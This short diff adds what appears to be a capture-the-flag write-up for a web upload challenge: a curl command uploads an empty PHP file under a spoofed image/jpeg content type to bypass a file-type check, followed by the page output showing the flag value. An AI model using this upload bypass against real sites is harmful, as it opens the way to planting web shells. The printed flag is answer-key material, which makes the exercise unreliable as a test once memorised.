@@ -1,0 +1,5 @@
+- touch /tmp/test.php
+- curl -s -X POST -F "uploaded=@/tmp/test.php;type=image/jpeg" -F "Upload=Upload" "http://$1/index.php?page=upload" | grep 'flag'
+
+<pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/test.php succesfully uploaded.</pre>
+
